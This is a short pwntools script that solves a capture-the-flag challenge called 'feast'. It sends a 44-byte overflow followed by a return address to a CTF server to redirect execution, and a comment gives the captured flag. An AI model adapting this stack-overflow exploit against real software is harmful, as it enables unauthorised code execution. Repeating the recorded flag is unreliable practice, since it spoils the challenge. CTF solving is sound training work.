#!/usr/bin/env python3

from pwn import *

exe = ELF("feast")

context.binary = exe


def conn():
	if False:
		return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
	else:
		return remote("pwn.red.csaw.io", 5001)


def main():
	r = conn()
	r.recvuntil("> ")
	r.sendline("a"*44 + "\x86\x85\x04\x08") #0x08048586
	r.interactive()


if __name__ == "__main__":
	main()

# Flag : flag{3nj0y_7h3_d1nN3r_B16_w1Nn3r!}
# 1 hr in
